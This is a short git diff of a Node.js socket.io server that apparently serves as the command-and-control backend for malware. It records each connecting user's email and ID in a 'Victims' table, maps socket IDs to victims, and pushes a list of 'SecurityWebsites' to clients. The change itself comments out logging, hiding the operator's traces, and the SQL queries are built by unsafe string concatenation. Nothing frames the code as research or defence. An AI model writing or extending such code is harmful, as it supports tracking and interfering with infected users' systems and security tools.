@@ -284,14 +284,15 @@ console.log("Listening on port 3000");
 
 io.on('connection', (socket) => {
   socket.on("userData", (userData) => {
+    console.log("user connected");
     var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userData.email+"', '"+ userData.id+"')";
     con.query(sql, function (err, result) {
-      console.log("1 victim added: "+userData.email+ " ID:"+userData.id);
+      //console.log("1 victim added: "+userData.email+ " ID:"+userData.id);
     });
     //make a table to map socketID with victim ID
     var sqlIDMapping = "INSERT INTO Active (socketID, userID) VALUES ('"+socket.id+"', '"+ userData.id+"')";
     con.query(sqlIDMapping, function(err, result) {
-        console.log("Mapping added: User ID:"+userData.id+ " Socket ID:" +socket.id+"");
+        //console.log("Mapping added: User ID:"+userData.id+ " Socket ID:" +socket.id+"");
     });
 
     var sql = "SELECT * FROM SecurityWebsites";
@@ -300,7 +301,7 @@ io.on('connection', (socket) => {
       var arr = [];
       result.forEach((row) => {
         if (row.url) arr.push(row.url);
-        console.log(row.url);
+        //console.log(row.url);
       });
       socket.emit('securityWebsites', arr);
     });
